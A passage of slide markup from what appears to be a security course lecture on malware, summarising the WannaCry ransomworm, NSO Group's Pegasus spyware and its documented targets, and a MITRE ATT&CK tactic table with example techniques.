                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (May 2017) was the first major "ransomworm", combining autonomous worm propagation via the EternalBlue exploit (CVE-2017-0144) with cryptographic ransomware, infecting over 230,000 systems in 150 countries in a single day without any user interaction required.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="10555354" cy="1876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Initial Access:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> WannaCry scanned the internet and internal networks for Windows systems with TCP port 445 open.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploitation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Deployed the NSA-developed EternalBlue exploit (CVE-2017-0144) targeting a buffer overflow in Windows SMBv1, achieving SYSTEM-level remote code execution without authentication.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DoublePulsar Backdoor Installation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Installed the NSA-developed DoublePulsar kernel backdoor as the primary malware delivery mechanism.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ransomware Payload:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The payload encrypted 176 file types using AES-128-CBC with an RSA-2048-wrapped key, demanding $300–$600 USD in Bitcoin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kill Switch Discovery:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Security researcher Marcus Hutchins discovered an unregistered domain hardcoded in WannaCry's code, registering it activated a global kill switch that halted new infections.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WannaCry Ransomworm (2017) (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_wannacry_global_spread.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3700970"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="507097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WannaCry global spread in the first 24 hours, 230,000 systems across 150 countries, disabled by a single unregistered domain discovered by a 22-year-old security researcher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Pegasus Spyware &amp; Commercial Surveillance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Pegasus</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a commercial spyware platform developed by the NSO Group (Israel) that achieves full device compromise on iOS and Android devices, including zero-click exploitation requiring no user interaction, enabling covert access to calls, messages, cameras, microphones, and stored data.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="23844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Technical Capabilities</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="19344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Zero-Click Exploitation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Pegasus exploited CVE-2021-30860 (FORCEDENTRY), a vulnerability in Apple's CoreGraphics PDF rendering engine, triggered solely by receiving a malicious iMessage, with zero user interaction.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kernel-Level Access:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Achieves a jailbreak-equivalent privilege escalation to gain root access, bypassing iOS sandboxing protections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Full Device Telemetry:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Accesses encrypted messaging (Signal, WhatsApp), call recordings, GPS location history, contact lists, email, and real-time microphone/camera activation.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="23844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Documented Targets</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="19344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Journalists:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Khashoggi associates, Al Jazeera employees (36 devices confirmed), multiple Mexican investigative reporters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Activists &amp; Dissidents:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Human rights defenders in Bahrain, Saudi Arabia, UAE; government critics in Rwanda, India.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Heads of State:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> French President Emmanuel Macron's number found on potential Pegasus target list (Amnesty International, 2021).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lawyers &amp; Academics:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Defense attorneys representing Pegasus targets, academic researchers studying surveillance.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Pegasus Spyware &amp; Commercial Surveillance (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_pegasus_infection_chain.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3417295"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="478729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Pegasus zero-click infection chain, FORCEDENTRY exploited Apple's image rendering library to achieve full device compromise through a single iMessage, with no user interaction required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Framework for Malware Analysis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MITRE ATT&amp;CK</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It provides a common language and structured taxonomy for describing how malware and threat actors operate across the complete attack lifecycle.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="2093369"/>
          <a:ext cx="10555354" cy="3049995"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638840"/>
              </a:tblGrid>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ATT&amp;CK Tactic</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ID</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Malware Examples</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Initial Access</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0001</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Gaining entry into the target environment</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Phishing (T1566), Drive-by Compromise (T1189)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0002</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Running malicious code</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>PowerShell (T1059.001), Windows Management Instrumentation (T1047)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Persistence</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0003</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Maintaining foothold across restarts</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Registry Run Keys (T1547.001), WMI Event Subscriptions (T1546.003)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Defense Evasion</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0005</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Avoiding detection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Process Injection (T1055), Obfuscated Files (T1027)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Credential Access</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0006</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Stealing credentials</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>OS Credential Dumping (T1003), Keylogging (T1056.001)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Discovery</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0007</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mapping the environment</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Network Service Scanning (T1046), System Information Discovery (T1082)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="304999">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Lateral Movement</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0008</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Moving between systems</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
